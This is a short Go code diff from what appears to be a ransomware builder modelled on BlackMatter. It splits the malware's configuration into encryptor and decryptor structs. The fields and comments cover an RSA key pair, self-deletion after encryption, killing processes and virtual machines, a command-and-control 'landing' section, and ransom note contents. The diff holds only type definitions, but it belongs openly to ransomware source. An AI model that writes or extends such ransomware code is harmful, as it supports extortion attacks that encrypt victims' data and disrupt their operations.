@@ -20,8 +20,8 @@ type cfg_log struct {
 
 type cfg_message struct {
 	Enable  string `json:"enable"`
-	Name    string `json:"file-name"`    // File name of the ransomnote
-	Content string `json:"file-content"` // Contents of the ransomnote
+	Name    string `json:"file-name"`              // File name of the ransomnote
+	Content string `json:"file-content,omitempty"` // Contents of the ransomnote
 }
 
 type cfg_landing struct {
@@ -41,7 +41,7 @@ type cfg_killprocess struct {
 	List   []string `json:"list"` // Kill processes / daemons
 }
 
-type BlackmatterConfig struct {
+type BlackmatterConfigEnc struct {
 	RSA_Key     string          `json:"rsa"`                // RSA-4096 Public Key
 	Self_Delete string          `json:"remove-self"`        // remove the executable after encryption
 	Concurrency string          `json:"worker-concurrency"` // multi-threaded operation
@@ -51,4 +51,13 @@ type BlackmatterConfig struct {
 	Landing     cfg_landing     `json:"landing"`            // Command&Control
 	KillVM      cfg_killvm      `json:"kill-vm"`            // VM Allow-List
 	KillProcess cfg_killprocess `json:"kill-process"`       // Process Block-list
+}
+
+type BlackmatterConfigDec struct {
+	RSA_Key     string      `json:"rsa"`                // RSA-4096 Private Key
+	Self_Delete string      `json:"remove-self"`        // remove the executable after encryption
+	Concurrency string      `json:"worker-concurrency"` // multi-threaded operation
+	Disk        cfg_disk    `json:"disk"`               // Encryption
+	Log         cfg_log     `json:"log"`                // Logging
+	Message     cfg_message `json:"message"`            // Ransomnote
 }
